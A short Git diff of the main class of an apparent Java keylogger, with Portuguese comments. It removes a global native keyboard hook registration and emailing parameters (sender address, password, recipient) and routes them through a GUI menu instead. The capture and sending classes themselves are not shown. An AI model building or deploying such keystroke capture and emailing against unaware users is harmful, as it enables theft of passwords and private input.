@@ -5,7 +5,6 @@ import java.util.logging.LogManager;
 import java.util.logging.Logger;
 
 import org.jnativehook.GlobalScreen;
-import org.jnativehook.NativeHookException;
 
 public class Main {
 
@@ -29,23 +28,9 @@ public class Main {
 		 * e alterar o valor 22 no if para o que desejar.
 		 */
 		Subject captura = new Captura();
-		Observer envio = new Envio(captura, "seu email aqui", "sua senha aqui", 
-				"email do destinatario aqui");
+		Observer envio = new Envio(captura);
 		captura.addOberser(envio);
-		
-		/**
-		 * Registrar gancho para captura
-		 */
-		try {
-			GlobalScreen.registerNativeHook();
-		} catch(NativeHookException e) {
-			e.printStackTrace();
-		}
-		
-		/**
-		 * Adicionar a classe de escuta
-		 */
-		GlobalScreen.addNativeKeyListener((Captura)captura);
+		MenuGUI menu = new MenuGUI((Envio) envio, (Captura) captura);
 	}
 
 }
